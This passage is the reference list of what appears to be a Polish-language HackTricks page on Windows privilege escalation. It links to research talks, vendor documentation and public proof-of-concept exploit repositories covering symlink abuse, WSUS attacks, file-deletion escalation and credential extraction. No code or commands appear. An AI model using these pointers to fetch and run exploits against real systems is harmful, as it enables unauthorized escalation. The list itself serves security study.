- [17] [Łącze do przeszłości. Nadużywanie dowiązań symbolicznych w Windows](https://infocon.org/cons/SyScan/SyScan%202015%20Singapore/SyScan%202015%20Singapore%20presentations/SyScan15%20James%20Forshaw%20-%20A%20Link%20to%20the%20Past.pdf)
- [18] [RIP RegPwn — MDSec](https://www.mdsec.co.uk/2026/03/rip-regpwn/)
- [19] [RegPwn BOF (port Cobalt Strike BOF)](https://github.com/Flangvik/RegPwnBOF)
- [20] [ZDI — Node.js: niebezpieczne rozwiązywanie modułów w Windows](https://www.thezdi.com/blog/2026/4/8/nodejs-trust-falls-dangerous-module-resolution-on-windows)
- [21] [Moduły Node.js: ładowanie z folderów `node_modules`](https://nodejs.org/api/modules.html#loading-from-node_modules-folders)
- [22] [npm package.json: `optionalDependencies`](https://docs.npmjs.com/cli/v11/configuring-npm/package-json#optionaldependencies)
- [23] [Process Monitor (Procmon)](https://learn.microsoft.com/en-us/sysinternals/downloads/procmon)
- [24] [Trail of Bits — rozwiązane zadania z checklisty C/C++](https://blog.trailofbits.com/2026/05/05/c/c-checklist-challenges-solved/)
- [25] [Microsoft Learn — funkcja RtlQueryRegistryValues](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-rtlqueryregistryvalues)
- [26] [PowerShell Gallery — NtObjectManager](https://www.powershellgallery.com/packages/NtObjectManager/2.0.1)
- [27] [sec-zone — CVE-2026-36213](https://github.com/sec-zone/CVE-2026-36213)
- [28] [sec-zone — przejęcie plików binarnych usług](https://github.com/sec-zone/Hijack-service-binaries)
- [29] [Pwn2Own z Microslop: łączenie CLDFLT i wyścigów w jądrze DirectX w celu LPE w Windows](https://dungnm.hashnode.dev/pwn2own-with-microslop)
- [30] [Jeden I/O Ring, by wszystkimi rządzić: pełna prymitywa exploitowa odczytu/zapisu w Windows 11](https://windows-internals.com/one-i-o-ring-to-rule-them-all-a-full-read-write-exploit-primitive-on-windows-11/)
- [31] [Nadużywanie dowolnego usuwania plików w celu eskalacji uprawnień i inne przydatne sztuczki](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks)
- [32] [thezdi/PoC — kod exploita FilesystemEoPs](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs)
- [33] [GoSecure — ataki na WSUS, część 2: CVE-2020-1013, 1-day lokalnej eskalacji uprawnień w Windows 10](https://www.gosecure.net/blog/2020/09/08/wsus-attacks-part-2-cve-2020-1013-a-windows-10-local-privilege-escalation-1-day/)
- [34] [Windows 7: poznawanie Credential Manager i Windows Vault](https://www.neowin.net/news/windows-7-exploring-credential-manager-and-windows-vault)
- [35] [jas502n — PoC CVE-2019-1388](https://github.com/jas502n/CVE-2019-1388)
- [36] [research.nccgroup.com — Kerberos Resource Based Constrained Delegation: jak zmiana obrazu prowadzi do eskalacji uprawnień](https://research.nccgroup.com/2019/08/20/kerberos-resource-based-constrained-delegation-when-an-image-change-leads-to-a-privilege-escalation)
- [37] [blog.ropnop.com — wyodrębnianie prywatnych kluczy SSH z agenta SSH w Windows 10](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent)
- [38] [SpecterOps — zamienianie serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) — część 1](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-1/)
- [39] [SpecterOps — zamienianie serwerów aktualizacji w przedsiębiorstwie w fabryki backdoorów (0_o) — część 2](https://specterops.io/blog/2026/08/05/turning-enterprise-update-servers-into-backdoor-factories-part-2/)
- [40] [bagelByt3s — NotWSUSPicious](https://github.com/bagelByt3s/NotWSUSPicious)
- [41] [Exodus Intelligence — eskalacja uprawnień przez usunięcie folderu Windows Installer](https://blog.exodusintel.com/2026/07/06/microsoft-windows-installer-folder-delete-privilege-escalation/)
- [42] [Microsoft Security Response Center — CVE-2025-27727](https://msrc.microsoft.com/update-guide/vulnerability/CVE-2025-27727)
{{#include ../../banners/hacktricks-training.md}}
